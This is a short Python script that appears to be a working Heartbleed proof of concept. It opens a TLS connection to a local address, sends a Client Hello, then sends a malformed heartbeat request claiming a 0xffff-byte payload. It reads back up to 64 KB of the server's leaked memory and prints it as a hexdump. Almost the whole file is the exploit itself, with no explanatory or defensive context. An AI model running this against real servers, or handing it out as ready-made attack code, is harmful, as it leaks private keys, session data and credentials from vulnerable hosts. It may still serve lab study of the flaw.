import socket
from hexdump import hexdump

# https://tls12.xargs.org/#client-hello
tls_client_hello_hex = "1603020034010000300302000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f000002002f01000005ff01000100"

tls_heartbeat_hex = "180302000301ffff"

server_addr = ("127.0.0.1", 50443)

print(f"Connecting to {server_addr[0]}:{server_addr[1]}")

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.connect(server_addr)
    print("Connected")

    print("\nSending TLS Client Hello")
    tls_client_hello = bytes.fromhex(tls_client_hello_hex)
    sock.sendall(tls_client_hello)
    print(f"Sent {len(tls_client_hello):,} bytes")

    print("\nReceiving TLS Server Hello")
    buf = sock.recv(8 * 1024)
    print(f"Received {len(buf):,} bytes")

    print("\nSending Heartbeat Request")
    tls_heartbeat = bytes.fromhex(tls_heartbeat_hex)
    sock.sendall(tls_heartbeat)
    print(f"Sent {len(tls_heartbeat):,} bytes")

    print("\nReceiving Heartbeat Reply and server memory")
    buf = sock.recv(64 * 1024)
    print(f"Received {len(buf):,} bytes")

    print("\nClosing socket")
    sock.close()

    print()
    print("Bytes Received")
    print("--------------")
    hexdump(buf)
